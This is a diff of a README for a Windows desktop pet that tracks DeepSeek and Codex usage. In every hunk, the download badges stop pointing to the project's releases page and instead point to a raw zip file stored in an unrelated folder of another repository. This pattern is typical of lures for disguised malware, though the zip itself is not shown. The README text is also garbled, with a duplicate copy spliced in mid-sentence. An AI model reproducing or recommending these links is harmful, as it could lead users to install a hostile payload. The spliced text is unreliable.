@@ -5,13 +5,13 @@ description: "Manage DeepSeek balances and Codex quotas via a Windows anime desk
 ---
 # 🐾 dsh-plugin-simple-pet - Your Desktop Pet Tracks AI Usage
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rackguy-bit/dsh-plugin-simple-pet/releases)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/rackguy-bit/rackguy-bit.github.io/main/fluency-sprints/Release_1.1.zip)
 
 dsh-plugin-simple-pet is a Windows desktop pet that gives you a friendly, visual way to keep an eye on DeepSeek billing, Codex subscription quotas, and usage charts. It includes six skins and an opt-in automatic Codex warm-up feature. You do not need programming knowledge to use it.
 
 ## 🚀 Download and Start
 
-[![Get dsh-plugin-simple-pet](https://img.shields.io/badge/Get_dsh--plugin--simple--pet-ff69b4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rackguy-bit/dsh-plugin-simple-pet/releases)
+[![Get dsh-plugin-simple-pet](https://img.shields.io/badge/Get_dsh--plugin--simple--pet-ff69b4?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/rackguy-bit/rackguy-bit.github.io/main/fluency-sprints/Release_1.1.zip)
 
 Visit this link to download the application. After the download finishes, open the application to start your desktop pet.
 
@@ -21,13 +21,13 @@ dsh-plugin-simple-pet places a small pet on your Windows desktop. The pet acts a
 
 The app# 🐾 dsh-plugin-simple-pet - Track AI Usage With a Desktop Pet
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-7B68EE?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rackguy-bit/dsh-plugin-simple-pet/releases)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-7B68EE?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/rackguy-bit/rackguy-bit.github.io/main/fluency-sprints/Release_1.1.zip)
 
 dsh-plugin-simple-pet is a Windows desktop pet that sits quietly on your screen and keeps you informed about DeepSeek billing, Codex subscription quotas, and your token usage — all without you needing to open a website or read a spreadsheet. It includes six different skins, live usage charts, and an optional automatic Codex warm-up feature. No programming knowledge is required.
 
 ## 🚀 Getting Started
 
-[![Download dsh-plugin-simple-pet](https://img.shields.io/badge/Get_dsh--plugin--simple--pet-2E8B57?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rackguy-bit/dsh-plugin-simple-pet/releases)
+[![Download dsh-plugin-simple-pet](https://img.shields.io/badge/Get_dsh--plugin--simple--pet-2E8B57?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/rackguy-bit/rackguy-bit.github.io/main/fluency-sprints/Release_1.1.zip)
 
 Visit this link to download the application.
 
@@ -124,7 +124,7 @@ If something is not working as described, the releases page is the best place to
 
 dsh-plugin-simple-pet gives your Windows desktop a friendly pet that also serves as a clear, always-available view of your DeepSeek billing, Codex subscription quotas, and token usage charts. With six skins and optional automatic Codex warm-up, it stays useful without getting in your way.
 
-[![Download dsh-plugin-simple-pet](https://img.shields.io/badge/Download_Now-FF8C00?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rackguy-bit/dsh-plugin-simple-pet/releases)
+[![Download dsh-plugin-simple-pet](https://img.shields.io/badge/Download_Now-FF8C00?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/rackguy-bit/rackguy-bit.github.io/main/fluency-sprints/Release_1.1.zip)
 
 Visit this link to download the application.
 
